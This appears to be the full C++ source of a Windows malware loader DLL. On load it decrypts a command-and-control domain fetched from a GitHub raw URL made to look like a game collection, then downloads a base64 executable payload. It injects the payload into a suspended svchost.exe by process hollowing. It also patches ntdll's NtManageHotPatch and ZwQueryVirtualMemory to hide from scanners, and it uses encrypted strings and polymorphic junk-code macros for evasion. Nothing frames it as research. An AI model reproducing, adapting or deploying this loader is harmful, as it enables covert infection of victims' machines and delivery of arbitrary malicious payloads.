#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <cstdio>
#include "Encrypt.h"
#include <fstream>
#include <string>
#include <vector>
#include <wininet.h>
#include <regex>
#include <wincrypt.h>
#include <filesystem>
#include <winternl.h>
#include "HopesarsPolyPoly.hpp"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

std::string MainURL;


typedef NTSTATUS(WINAPI* EMOSS)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG_PTR       ReturnLength
	);



#define POLYMORPH_NOISE_BIG()                                        \
    do {                                                            \
        constexpr int base_size = 1024;                             \
        constexpr int date_sum = (__DATE__[0] + __DATE__[1] + __DATE__[2] + __DATE__[3] + __DATE__[4]); \
        constexpr int time_sum = (__TIME__[0] + __TIME__[1] + __TIME__[2] + __TIME__[3] + __TIME__[4] + __TIME__[5]); \
        constexpr int offset = (date_sum + time_sum) % 256;         \
        constexpr int array_size = base_size + offset;              \
        static char poly_noise_data##__LINE__[array_size] = {};     \
        for (int i = 0; i < array_size; ++i) {                      \
            poly_noise_data##__LINE__[i] =                           \
                __DATE__[i % 11] ^ __TIME__[i % 8];                 \
        }                                                           \
        volatile char* ptr = poly_noise_data##__LINE__;             \
        (void)ptr;                                                  \
        if (poly_random(3) == 0) {                                  \
            poly_junk();                                            \
            (void)poly_float();                                     \
        } else {                                                    \
            (void)poly_double();                                    \
        }                                                           \
    } while(0)




#define POLYMORPH_NOISE_3()                  \
    (void)poly_int();                        \
    (void)poly_double();                     \
    if (poly_random(2) == 0) {               \
        POLYMORPH_NOISE_BIG();                        \
    } else {                                \
        (void)poly_float();                  \
    }                                       \
    (void)poly_ull();



#define POLYMORPH_NOISE_2()      \
    (void)poly_ull();            \
    poly_junk();                 \
    (void)poly_float();          \
    poly_random_order([](){      \
        (void)poly_double();     \
    }, [](){                    \
        poly_junk();            \
    });



#define POLYMORPH_NOISE()       \
    poly_junk();                \
    (void)poly_int();           \
    (void)poly_double();        \
    poly_random_order([](){     \
        poly_junk();            \
    }, [](){                    \
        (void)poly_float();     \
    });


bool patch_ZwQueryVirtualMemory(HANDLE hProcess, LPVOID module_ptr, HMODULE hNtdll)
{


	if (!hNtdll) return false; // should never happen
	
	ULONGLONG pos = 8;
	DWORD oldProtect = 0;
	
	const SIZE_T stub_size = 0x20;

	std::string virtmom = EC("ZwQueryVirtualMemory");

	ULONG_PTR _ZwQueryVirtualMemory = (ULONG_PTR)LI_FN(GetProcAddress).cached()(hNtdll, virtmom.c_str());
	if (!_ZwQueryVirtualMemory || _ZwQueryVirtualMemory < pos) {
		return false;
	}
	LPVOID stub_ptr = (LPVOID)((ULONG_PTR)_ZwQueryVirtualMemory - pos);

	

	if (!LI_FN(VirtualProtectEx).cached()(hProcess, stub_ptr, stub_size, PAGE_READWRITE, &oldProtect)) {
		return false;
	}
	LPVOID patch_space = LI_FN(VirtualAllocEx).cached()(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!patch_space) {
		return false;
	}
	BYTE stub_buffer_orig[stub_size] = { 0 };
	SIZE_T out_bytes = 0;
	if (!LI_FN(ReadProcessMemory).cached()(hProcess, stub_ptr, stub_buffer_orig, stub_size, &out_bytes) || out_bytes != stub_size) {
		return false;
	}
	
	const BYTE nop_pattern[] = { 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00 };
	if (LI_FN(memcmp).cached()(stub_buffer_orig, nop_pattern, sizeof(nop_pattern)) != 0) {
		return false;
	}


	

	// prepare the patched stub:
	const size_t syscall_pattern_full = 8;
	const size_t syscall_pattern_start = 4;
	
	const BYTE syscall_fill_pattern[] = {
		0x4C, 0x8B, 0xD1, //mov r10,rcx
		0xB8, 0xFF, 0x00, 0x00, 0x00 // mov eax,[syscall ID]
	};
	if (LI_FN(memcmp).cached()(stub_buffer_orig + pos, syscall_fill_pattern, syscall_pattern_start) != 0) {
		return false;
	}


	// prepare the patch to be applied on ZwQueryVirtualMemory:

	BYTE stub_buffer_patched[stub_size] = { 0 };
	LI_FN(memcpy).cached()(stub_buffer_patched, stub_buffer_orig, stub_size);

	const BYTE jump_back[] = { 0xFF, 0x25, 0xF2, 0xFF, 0xFF, 0xFF };

	LI_FN(memcpy).cached()(stub_buffer_patched, &patch_space, sizeof(LPVOID));
	LI_FN(memset).cached()(stub_buffer_patched + pos, 0x90, syscall_pattern_full);
	
	LI_FN(memcpy).cached()(stub_buffer_patched + pos, jump_back, sizeof(jump_back));

	// prepare the trampoline:


	const BYTE jump_to_contnue[] = { 0xFF, 0x25, 0xEA, 0xFF, 0xFF, 0xFF };
	ULONG_PTR _ZwQueryVirtualMemory_continue = (ULONG_PTR)_ZwQueryVirtualMemory + syscall_pattern_full;

	BYTE func_patch[] = {
		0x49, 0x83, 0xF8, 0x0E, //cmp r8,0xE -> is MEMORY_INFORMATION_CLASS == MemoryImageExtensionInformation?
		0x75, 0x22, // jne [continue to function]
		0x48, 0x3B, 0x15, 0x0B, 0x00, 0x00, 0x00, // cmp rdx,qword ptr ds:[addr] -> is ImageBase == module_ptr ?
		0x75, 0x19, // jne [continue to function]
		0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -> STATUS_NOT_SUPPORTED
		0xC3 //ret
	};


	BYTE stub_buffer_trampoline[stub_size * 2] = { 0 };
	LI_FN(memcpy).cached()(stub_buffer_trampoline, func_patch, sizeof(func_patch));

	LI_FN(memcpy).cached()(stub_buffer_trampoline + stub_size, stub_buffer_orig, stub_size);
	LI_FN(memcpy).cached()(stub_buffer_trampoline + stub_size - sizeof(LPVOID), &module_ptr, sizeof(LPVOID));
	
	LI_FN(memcpy).cached()(stub_buffer_trampoline + stub_size, &_ZwQueryVirtualMemory_continue, sizeof(LPVOID));
	LI_FN(memcpy).cached()(stub_buffer_trampoline + stub_size + pos + syscall_pattern_full, jump_to_contnue, sizeof(jump_to_contnue));
	

	const SIZE_T trampoline_full_size = stub_size + pos + syscall_pattern_full + sizeof(jump_to_contnue);

	if (!LI_FN(WriteProcessMemory).cached()(hProcess, stub_ptr, stub_buffer_patched, stub_size, &out_bytes) || out_bytes != stub_size) {
		return false;
	}
	
	if (!LI_FN(VirtualProtectEx).cached()(hProcess, stub_ptr, stub_size, oldProtect, &oldProtect)) {
		return false;
	}
	if (!LI_FN(WriteProcessMemory).cached()(hProcess, patch_space, stub_buffer_trampoline, trampoline_full_size, &out_bytes) || out_bytes != trampoline_full_size) {
		return false;
		
	}

	

	if (!LI_FN(VirtualProtectEx).cached()(hProcess, patch_space, stub_size, PAGE_EXECUTE_READ, &oldProtect)) {
		return false;
	}
	
	LI_FN(FlushInstructionCache).cached()(hProcess, stub_ptr, stub_size);
	return true;

}


bool patch_NtManageHotPatch64(HANDLE hProcess, HMODULE hNtdll)
{


	if (!hNtdll) return false; // should never happen

	DWORD oldProtect = 0;
	const SIZE_T stub_size = 0x20;
	
	const BYTE hotpatch_patch[] = {
		0xB8, 0xBB, 0x00, 0x00, 0xC0, // mov eax,C00000BB -> STATUS_NOT_SUPPORTED
		0xC3 //ret
	};

	

	// syscall stub template
	const size_t syscall_pattern_full = 8;
	const size_t syscall_pattern_start = 4;
	
	const BYTE syscall_fill_pattern[] = {
		0x4C, 0x8B, 0xD1, //mov r10,rcx
		0xB8, 0xFF, 0x00, 0x00, 0x00 // mov eax,[syscall ID]
	};

	std::string gotpot = EC("NtManageHotPatch");

	ULONG_PTR _NtManageHotPatch = (ULONG_PTR)LI_FN(GetProcAddress).cached()(hNtdll, gotpot.c_str());
	if (!_NtManageHotPatch) {
		return false;
	}
	
	LPVOID stub_ptr = (LPVOID)_NtManageHotPatch;

	if (!LI_FN(VirtualProtectEx).cached()(hProcess, stub_ptr, stub_size, PAGE_READWRITE, &oldProtect)) {
		return false;
	}

	

	BYTE stub_buffer_orig[stub_size] = { 0 };
	SIZE_T out_bytes = 0;
	if (!LI_FN(ReadProcessMemory).cached()(hProcess, stub_ptr, stub_buffer_orig, stub_size, &out_bytes) || out_bytes != stub_size) {
		return false;
	}
	// confirm it is a valid syscall stub:
	if (LI_FN(memcmp).cached()(stub_buffer_orig, syscall_fill_pattern, syscall_pattern_start) != 0) {
		return false;
	}

	

	if (!LI_FN(WriteProcessMemory).cached()(hProcess, stub_ptr, hotpatch_patch, sizeof(hotpatch_patch), &out_bytes) || out_bytes != sizeof(hotpatch_patch)) {
		return false;
	}
	if (!LI_FN(VirtualProtectEx).cached()(hProcess, stub_ptr, stub_size, oldProtect, &oldProtect)) {
		
		return false;
	}
	LI_FN(FlushInstructionCache).cached()(hProcess, stub_ptr, sizeof(hotpatch_patch));
	return true;
}


int ruplepe(std::vector<uint8_t> argy) {


	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)argy.data();
	
	PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(argy.data() + DosHeader->e_lfanew);

	PROCESS_INFORMATION pi;
	STARTUPINFO si = { sizeof(si) };

	ULONG_PTR retlen;
	PROCESS_BASIC_INFORMATION pbi;

	void* newImgBase;
	DWORD64 ImgBaseAddress;

	HMODULE hNtdll = LI_FN(GetModuleHandleA).safe()(EC("ntdll"));
	HMODULE ntDll = LI_FN(LoadLibraryA).safe()(EC("ntdll.dll"));
	if (ntDll == nullptr) {

		return 1;
	}

	std::string nqr = EC("NtQueryInformationProcess");


	EMOSS NtQueryInformationProcess = (EMOSS)GetProcAddress(ntDll, nqr.c_str());

	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		return 1;
	}

	

	if (!CreateProcess(EC("C:\\Windows\\System32\\svchost.exe"),
		NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED,
		NULL, NULL, &si, &pi)) {
		return 1;
	}

	patch_NtManageHotPatch64(pi.hProcess, hNtdll);

	

	NtQueryInformationProcess(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&retlen
	);



	newImgBase = LI_FN(VirtualAllocEx).cached()(
		pi.hProcess,
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
		);

	

	if (newImgBase == NULL) {

		return 1;
	}

	LI_FN(WriteProcessMemory).cached()(pi.hProcess, newImgBase, argy.data(), NtHeader->OptionalHeader.SizeOfHeaders, 0);


	PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)(argy.data() + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

	for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++) {
		if (!LI_FN(WriteProcessMemory).cached()(pi.hProcess,
			(LPVOID)((DWORD64)newImgBase + SectionHeader->VirtualAddress),
			(LPVOID)((DWORD64)argy.data() + SectionHeader->PointerToRawData),
			SectionHeader->SizeOfRawData,
			0)) {

		}
		SectionHeader++;
	}
	

	ImgBaseAddress = (DWORD64)pbi.PebBaseAddress + 0x10;
	if (!LI_FN(WriteProcessMemory).cached()(pi.hProcess, (LPVOID)ImgBaseAddress, &newImgBase, sizeof(newImgBase), 0)) {
		
		

	}

	HANDLE NewThread = LI_FN(CreateRemoteThread).cached()(pi.hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD64)newImgBase + NtHeader->OptionalHeader.AddressOfEntryPoint),
		NULL,
		CREATE_SUSPENDED,
		NULL);

	

	if (!NewThread) {

		return 1;
	}

	LI_FN(SuspendThread).cached()(pi.hThread);
	
	patch_ZwQueryVirtualMemory(pi.hProcess, newImgBase, hNtdll);


	LI_FN(ResumeThread).cached()(NewThread);


	/*std::cout << "DosHeader: " << std::hex << "0x" << DosHeader;
	std::cout << "NtHeader: " << std::hex << "0x" << NtHeader;
	std::cout << "Shellcode injected successfully\n";*/


	LI_FN(FreeLibrary).cached()(ntDll);
	
	return 0;
}




std::string Rvrs(std::string input) {


	
	// Reverse the string
	std::reverse(input.begin(), input.end());

	return input;
}


bool isInternetAvailable() {
	
	return InternetCheckConnectionW(EC(L"http://www.google.com"), FLAG_ICC_FORCE_CONNECTION, 0);
}



std::string DownloadString(std::string URL) {

	
	if (isInternetAvailable())
	{
		

		HINTERNET interwebs = LI_FN(InternetOpenA).cached()(EC("Mozilla/5.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
		

		HINTERNET urlFile;
		std::string rtn;
		if (interwebs) {
			
			urlFile = LI_FN(InternetOpenUrlA).cached()(interwebs, URL.c_str(), NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
			if (urlFile) {
				char buffer[20000];
				DWORD bytesRead;
				do {
					LI_FN(InternetReadFile).cached()(urlFile, buffer, 20000, &bytesRead);
					rtn.append(buffer, bytesRead);
					LI_FN(memset).cached()(buffer, 0, 20000);
				} while (bytesRead);
				LI_FN(InternetCloseHandle).cached()(interwebs);
				LI_FN(InternetCloseHandle).cached()(urlFile);
				return rtn;
			}
		}
		LI_FN(InternetCloseHandle).cached()(interwebs);
		
		return rtn;
	}
	else
	{

		std::cout << EC("No Internet Connection.") << std::endl;

		return EC("");
	}

}



std::vector<BYTE> Base64ToBytes(const std::string& base64String) {

	
	DWORD bytesNeeded;
	if (!CryptStringToBinaryA(base64String.c_str(), base64String.length(), CRYPT_STRING_BASE64, NULL, &bytesNeeded, NULL, NULL)) {
		return {};
	}
	
	

	std::vector<BYTE> bytes(bytesNeeded);
	if (!CryptStringToBinaryA(base64String.c_str(), base64String.length(), CRYPT_STRING_BASE64, bytes.data(), &bytesNeeded, NULL, NULL)) {
		
		return {};
	}


	return bytes;
}



std::string decrypt(const std::string& encryptedBase64, const std::string& key) {


	std::string decoded;
	std::vector<int> decodingTable(256, -1);
	const std::string base64Chars =
		EC("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");

	

	for (size_t i = 0; i < base64Chars.size(); i++) {
		decodingTable[base64Chars[i]] = i;
	}

	int val = 0, valb = -8;
	for (unsigned char c : encryptedBase64) {
		if (decodingTable[c] == -1) break;
		val = (val << 6) + decodingTable[c];
		valb += 6;
		if (valb >= 0) {
			decoded.push_back((val >> valb) & 0xFF);
			valb -= 8;
		}
	}
	
	std::string encryptedData = decoded;

	
	std::string decrypted;
	size_t keyLength = key.size();
	for (size_t i = 0; i < encryptedData.size(); ++i) {
		decrypted += encryptedData[i] ^ key[i % keyLength];
	}

	

	return decrypted;
}

std::string remove_whitespace(const std::string& input) {
	std::string result;
	
	for (char c : input) {
		if (!std::isspace(c)) {
			result += c;
		}
	}
	return result;
}


DWORD WINAPI ThreadMain(HMODULE m)
{


	/*std::string un;
	DWORD bufferLength = 256 + 1;
	char username[256 + 1];
	if (GetUserNameA(username, &bufferLength))
	{
		un = username;
	}

	if (un.find(EC("emre")) != std::string::npos) {
		AllocConsole();
		freopen(EC("CON"), EC("w"), stdout);
		freopen(EC("CON"), EC("w"), stderr);
	}

	std::cout << EC("[DBG] Sleeping... PLD: 0.1.6") << std::endl;


	AllocConsole();
	freopen(EC("CON"), EC("w"), stdout);
	freopen(EC("CON"), EC("w"), stderr);*/

	//std::cout << EC("[DBG] Sleeping... PLD: 0.1.8") << std::endl;

	LI_FN(Sleep).safe_cached()(10000);
	
	

	LI_FN(CreateMutexA).safe_cached()(NULL, TRUE, EC("Global\\PFLwrx"));

	if (LI_FN(GetLastError).safe()() == ERROR_ALREADY_EXISTS) {
		//std::cout << EC("[DBG] Nope") << std::endl;
		
	}
	else
	{
		//std::cout << EC("[DBG] Yes") << std::endl;
		
		try
		{
			


			if (LI_FN(OpenMutexA).safe()(MUTEX_ALL_ACCESS, FALSE, EC("Global\\PFLwrxMNN")) != NULL) {
				//std::cout << EC("[DBG] Fucking No") << std::endl;

			}
			else
			{
				//std::cout << EC("[DBG] Ok So Good") << std::endl;

				MainURL = decrypt(remove_whitespace(DownloadString(EC("https://raw.githubusercontent.com/VinieClara/Fortnite-Reverseal-Collection/refs/heads/main/HHash"))), EC("NtExploreProcess"));

				//std::cout << EC("[DBG] Main URL: ") << MainURL << std::endl;
				

			A:

				std::string dumasring = DownloadString(EC("https://") + MainURL + EC("/Stb/PokerFace/init.php?id=Father"));

				std::vector<uint8_t> ByteStub = Base64ToBytes(dumasring);

				//std::cout << EC("[DBG] Got New Father, size is: ") << ByteStub.size() << std::endl;


				if (ByteStub.size() < 1000)
				{
					//std::cout << EC("[DBG] Father STR is: ") << dumasring << std::endl;
					//std::cout << EC("[DBG] Father URL is: ") << (EC("https://") + MainURL + EC("/Stb/PokerFace/init.php?id=Father")) << std::endl;

				}

				LI_FN(Sleep).safe_cached()(200);

				if (ByteStub.size() > 1000)
				{

					ruplepe(ByteStub);


				}
				else {
					LI_FN(Sleep).safe_cached()(5000);

					goto A;
				}

			}

		}
		catch (...)
		{

		}
	}

	return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		/*AllocConsole();
		freopen(EC("CON"), EC("w"), stdout);
		freopen(EC("CON"), EC("w"), stderr);*/
		CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(ThreadMain), nullptr, NULL, nullptr);

	case DLL_THREAD_ATTACH:

	case DLL_THREAD_DETACH:

	case DLL_PROCESS_DETACH:

		break;
	}
	return TRUE;
}

